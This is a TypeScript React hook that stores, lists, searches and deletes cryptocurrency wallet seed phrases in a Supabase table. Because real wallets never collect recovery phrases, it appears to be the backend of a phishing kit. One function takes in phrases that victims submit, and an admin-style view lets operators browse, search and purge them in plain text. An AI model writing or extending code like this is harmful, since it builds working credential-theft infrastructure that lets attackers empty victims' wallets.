"use client";
import { useState, useEffect } from "react";
import { supabase } from "@/lib/supabase";

interface KeyPhrase {
  id: number;
  seed_phrase: string;
  submitted_at: string;
}

export function useKeyPhrases() {
  const [phrases, setPhrases] = useState<KeyPhrase[]>([]);
  const [filteredPhrases, setFilteredPhrases] = useState<KeyPhrase[]>([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const fetchPhrases = async () => {
    try {
      setIsLoading(true);
      setError(null);

      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const { data, error } = await (supabase as any)
        .from("key_phrases")
        .select("*")
        .order("submitted_at", { ascending: false });

      if (error) {
        throw error;
      }

      setPhrases(data || []);
      setFilteredPhrases(data || []);
    } catch (err) {
      console.error("Error fetching key phrases:", err);
      setError("Failed to load key phrases");
    } finally {
      setIsLoading(false);
    }
  };

  const submitPhrase = async (seedPhrase: string) => {
    try {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const { error } = await (supabase as any)
        .from("key_phrases")
        .insert({ seed_phrase: seedPhrase });

      if (error) {
        throw error;
      }

      // Refresh the list
      await fetchPhrases();
      return { success: true };
    } catch (err) {
      console.error("Error submitting key phrase:", err);
      return { success: false, error: err };
    }
  };

  const deletePhrase = async (id: number) => {
    try {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const { error } = await (supabase as any)
        .from("key_phrases")
        .delete()
        .eq("id", id);

      if (error) {
        throw error;
      }

      // Refresh the list
      await fetchPhrases();
      return { success: true };
    } catch (err) {
      console.error("Error deleting key phrase:", err);
      return { success: false, error: err };
    }
  };

  const deleteAllPhrases = async () => {
    try {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const { error } = await (supabase as any)
        .from("key_phrases")
        .delete()
        .neq("id", 0); // Delete all records

      if (error) {
        throw error;
      }

      // Refresh the list
      await fetchPhrases();
      return { success: true };
    } catch (err) {
      console.error("Error deleting all key phrases:", err);
      return { success: false, error: err };
    }
  };

  // Filter phrases based on search term
  useEffect(() => {
    if (!searchTerm.trim()) {
      setFilteredPhrases(phrases);
    } else {
      const filtered = phrases.filter((phrase) =>
        phrase.seed_phrase.toLowerCase().includes(searchTerm.toLowerCase())
      );
      setFilteredPhrases(filtered);
    }
  }, [phrases, searchTerm]);

  useEffect(() => {
    fetchPhrases();
  }, []);

  return {
    phrases: filteredPhrases,
    allPhrases: phrases,
    isLoading,
    error,
    searchTerm,
    setSearchTerm,
    submitPhrase,
    deletePhrase,
    deleteAllPhrases,
    refreshPhrases: fetchPhrases,
  };
}
